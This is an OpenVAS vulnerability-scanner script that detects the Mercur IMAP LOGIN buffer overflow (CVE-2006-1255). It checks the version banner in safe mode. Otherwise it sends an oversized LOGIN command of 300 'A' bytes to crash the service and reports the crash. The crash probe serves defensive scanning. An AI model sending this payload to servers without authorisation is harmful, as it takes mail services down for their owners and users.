# OpenVAS Vulnerability Test
# $Id: mercur_imap_buffer_overflow.nasl 13409 2019-02-01 13:13:33Z cfischer $
# Description: Mercur Mailserver/Messaging version <= 5.0 IMAP Overflow Vulnerability
#
# Authors:
# Ferdy Riphagen <f[dot]riphagen[at]nsec[dot]nl>
#
# Copyright:
# Copyright (C) 2008 Ferdy Riphagen
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

# Original advisory :
# http://archives.neohapsis.com/archives/fulldisclosure/2006-02/1837.html

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.200050");
  script_version("$Revision: 13409 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-01 14:13:33 +0100 (Fri, 01 Feb 2019) $");
  script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_bugtraq_id(17138);
  script_cve_id("CVE-2006-1255");
  script_name("Mercur Mailserver/Messaging version <= 5.0 IMAP Overflow Vulnerability");
  script_category(ACT_MIXED_ATTACK);
  script_family("Gain a shell remotely");
  script_copyright("This script is Copyright (C) 2008 Ferdy Riphagen");
  script_dependencies("imap4_banner.nasl");
  script_require_ports("Services/imap", 143);
  script_mandatory_keys("imap/mercur/detected");

  script_xref(name:"URL", value:"http://secunia.com/advisories/19267/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/17138");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"The Mercur IMAP4 Service running on the host is vulnerable to buffer overflows
  by sending a special crafted 'login' command.");

  script_tag(name:"impact", value:"An attacker can use this to crash the service, possible
  execute arbitrary code and gain some access privileges on the system.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_banner");

  exit(0);
}

include("imap_func.inc");
include("version_func.inc");

port = get_imap_port(default:143);
banner = get_imap_banner(port:port);
if(!banner || banner !~ "MERCUR.*IMAP4.Server" )
  exit(0);

if(safe_checks()) {
  if(banner && ver = egrep(pattern:".*MERCUR.*IMAP4.Server.*(v(4\.03|5\.00))", string:banner)) {
    report = report_fixed_ver(installed_version:ver, fixed_version:"See solution tag");
    security_message(port:port, data:report);
    exit(0);
  }
  exit(99);
} else {
  soc = open_sock_tcp(port);
  if(!soc)
    exit(0);

  exp = string("a0 LOGIN ", crap(data:raw_string(0x41), length:300), "\r\n");
  send(socket:soc, data:exp);

  recv = recv(socket:soc, length:1024);
  close(soc);

  soc = open_sock_tcp(port);
  if(soc) {
    send(socket:soc, data:string("a1 CAPABILITY \r\n"));
    recv2 = recv(socket:soc, length:1024);
    close(soc);
  }

  if(!soc || (!strlen(recv2))) {
    report = string("*** It was possible to crash the MERCUR IMAP4 Service.\n",
                    "*** At this time the remote service does not accepting any new requests.\n",
                    "*** You should check its state, and possible start it manually again.");
    security_message(port:port, data:report);
    exit(0);
  }
  exit(99);
}

exit(0);